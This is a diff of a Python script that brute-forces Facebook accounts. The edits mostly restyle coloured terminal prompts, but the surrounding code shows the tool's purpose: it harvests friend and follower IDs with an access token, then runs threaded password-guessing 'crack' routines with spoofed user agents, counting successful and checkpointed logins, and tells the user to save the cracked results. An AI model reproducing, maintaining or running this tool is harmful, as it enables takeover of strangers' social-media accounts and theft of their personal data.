@@ -88,8 +88,8 @@ def login():
 		token = open("login.txt", "r")
 		menu()
 	except KeyError, IOError:
-		token = raw_input("[\033[1;92m•\033[1;97m] ☆LOGIN TOKEN☆ : \033[1;92m")
-                jalan("[\033[1;92m•\033[1;97m] Please Wait \033[1;92m... \033[1;97m");time.sleep(000.05)
+		token = raw_input("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m ☆LOGIN TOKEN☆ : \033[1;92m")
+                jalan("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Please Wait \033[1;92m... \033[1;97m");time.sleep(000.05)
 		if token == "":
 			print("Wrong Input")
 		try:
@@ -106,7 +106,7 @@ def login():
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
-			exit("\033[1;97m[\033[1;92m•\033[1;97m] \033[1;91mToken Expired\033[1;97m")
+			exit("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m \033[1;91mToken Expired\033[1;97m")
 
 # Menu Raka Andrian Tara
 def menu():
@@ -116,14 +116,14 @@ def menu():
 		token = open("login.txt","r").read()
 	except KeyError:
 		os.system("rm -f login.txt")
-		exit("\033[1;97m[\033[1;92m•\033[1;97m] \033[1;91mToken Expired\033[1;97m")
+		exit("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m \033[1;91mToken Expired\033[1;97m")
 	try:
 		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
 	except IOError:
 		os.system("rm -f login.txt")
-		exit("\033[1;97m[\033[1;92m•\033[1;97m] \033[1;91mToken Expired\033[1;97m...")
+		exit("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m \033[1;91mToken Expired\033[1;97m...")
 	except requests.exceptions.ConnectionError:
-		exit("\033[1;97m[\033[1;92m•\033[1;97m] No Internet Connection...!")
+		exit("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m No Internet Connection...!")
 
 # Raka Logo
 	raka_logo()
@@ -222,7 +222,7 @@ def publik():
 			id.append(uid+"<=>"+nama)
 	except KeyError:
 		exit("\033[1;93m⋆✥⋆➣\033[1;97m Account Friend List Is Not Public")
-	print("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Total Id   : \033[0;92m%s\033[0;97m"%(len(id))) 
+	print("\n\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Total Id   : \033[0;92m%s\033[0;97m"%(len(id))) 
 
 def follower():
 	global token
@@ -238,7 +238,7 @@ def follower():
 			id.append(uid+"<=>"+nama)
 	except KeyError:
 		exit("\033[1;93m⋆✥⋆➣\033[1;97m Account Friend List Is Not Public")
-	print("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Total Id    : \033[0;91m%s\033[0;97m"%(len(id))) 
+	print("\n\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Total Id    : \033[0;91m%s\033[0;97m"%(len(id))) 
 
 def massal():
 	global token
@@ -259,32 +259,32 @@ def massal():
 				id.append(uid+"<=>"+nama)
 		except KeyError:
 			print("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Account Friend List Is Not Public")
-	print("[\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Total id    : \033[0;92m%s\033[0;96m"%(len(id)))
+	print("[\n\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Total id    : \033[0;92m%s\033[0;96m"%(len(id)))
 
 def method():
 	print("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Choose Crack Methode\n")
-	print("\033[1;96m[\033[1;93m1\033[1;96m] \033[1;92m⋆✥⋆➣ \033[1;97mB-API\033[1;97m [ \033[1;95mFast \033[1;97m]")
+	print("\033[1;96m[\033[1;93m1\033[1;96m] \033[1;92m⋆✥⋆➣ \033[1;97mB-Api\033[1;97m [ \033[1;95mFast \033[1;97m]")
 	print("\033[1;96m[\033[1;93m2\033[1;96m] \033[1;92m⋆✥⋆➣ \033[1;97mM-Basic\033[1;97m [ \033[1;95mFast \033[1;97m]")
-	print("\033[1;96m[\033[1;93m3\033[1;96m] \033[1;92m⋆✥⋆➣ \033[1;97mFree Facebook\033[1;97m [ \033[1;95mNormal \033[1;97m]\n")
+	print("\033[1;96m[\033[1;93m3\033[1;96m] \033[1;92m⋆✥⋆➣ \033[1;97mTouch Facebook\033[1;97m [ \033[1;95mNormal \033[1;97m]\n")
 	method = raw_input("\033[1;97m[\033[1;92m•\033[1;97m] \033[1;92m⋆✥⋆➣ \033[1;97mOption : \033[1;92m")
 	if method == "":
 		menu()
 	elif method == "1":
-		ask = raw_input("[\033[1;93m•\033[1;97m] Do you choose manual passwors ? y/t : \033[1;92m")
+		ask = raw_input("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Do you choose manual passwors ? y/t : \033[1;92m")
 		if ask == "y":
 			manual()
 		print(" ")
 		ThreadPool(30).map(bapi, id)
 		exit("Program End")
 	elif method == "2":
-		ask = raw_input("[\033[1;93m•\033[1;97m] Do you choose manual passwords ? y/t : \033[1;92m")
+		ask = raw_input("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Do you choose manual passwords ? y/t : \033[1;92m")
 		if ask == "y":
 			manual()
 		print(" ")
 		ThreadPool(30).map(mbasic, id)
 		exit("Program End")
 	elif method == "3":
-		ask = raw_input("[\033[1;92m•\033[1;97m] Do you choose manual passwords ? y/t : \033[1;92m")
+		ask = raw_input("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Do you choose manual passwords ? y/t : \033[1;92m")
 		if ask == "y":
 			manual()
 		print(" ")
@@ -328,7 +328,7 @@ def bapi(user):
                 ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420;]")
 	global loop, token
 	sys.stdout.write(
-		"\r[\033[1;92mR\033[1;97m] \033[0;92mCrack \033[0;93m••>\033[0;95m %s/%s ••> [OK:-%s] ® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
+		"\r\033[1;97m[\033[1;92mR\033[1;97m] \033[0;92mCrack \033[0;93m••>\033[0;95m %s/%s ••> [OK:-%s] ® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
@@ -424,7 +424,7 @@ def mobile(user):
                 ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/255.0.0.8.119;]")
 	global loop, token
 	sys.stdout.write(
-		"\r[\033[1;92mR\033[0;97m] \033[1;92mCrack \033[0;93m••>\033[0;95m %s/%s ••> [OK:-%s] ® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
+		"\r\033[1;97m[\033[1;92mR\033[0;97m] \033[1;92mCrack \033[0;93m••>\033[0;95m %s/%s ••> [OK:-%s] ® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
@@ -477,16 +477,16 @@ def manual():
                 ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
                 ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/255.0.0.8.119;]")
 	global loop, token
-	print("\n[•] Type , For 2nd Password For Example : 112233,334455,445566,223344 etc")
-	asu = raw_input("[•] Enter Passwords : ").split(",")
+	print("\n\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Type,For 2nd Password For Example : 112233,334455,445566,223344 etc")
+	asu = raw_input("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Enter Passwords : ").split(",")
 	if len(asu) =="":
-		exit("[•] Wrong Input")
-	print("[•] Enter 2-4 Passwords For Fast Cracking Speed\n")
+		exit("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Wrong Input")
+	print("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Enter 2-4 Passwords For Fast Cracking Speed\n")
 
 	def main(user):
 		global loop, token
 		sys.stdout.write(
-		        "\r[\033[1;92mR\033[0;97m] \033[1;92mCrack \033[0;93m••>\033[0;95m %s/%s ••> [OK:-%s] ® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
+		        "\r\033[1;97m[\033[1;92mR\033[0;97m] \033[1;92mCrack \033[0;93m••>\033[0;95m %s/%s ••> [OK:-%s] ® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
 		uid, name = user.split("<=>")
 		try:
@@ -524,12 +524,13 @@ def manual():
 			pass
 	p = ThreadPool(30)
 	p.map(main, id)
+        print("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Copy Paste Hasil Crack Dan Simpan Selama \033[1;92m3 \033[1;97mHari")
 	exit("\n\n # [>Program Close<]")
 
 def setting_ua():
 	print("[1] Change User-Agent")
 	print("[2] Default User-Agent")
-	ua = raw_input("\n[•] Choose : ")
+	ua = raw_input("\n\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Choose : ")
 	if ua =="":
 		menu()
 	elif ua == "1":
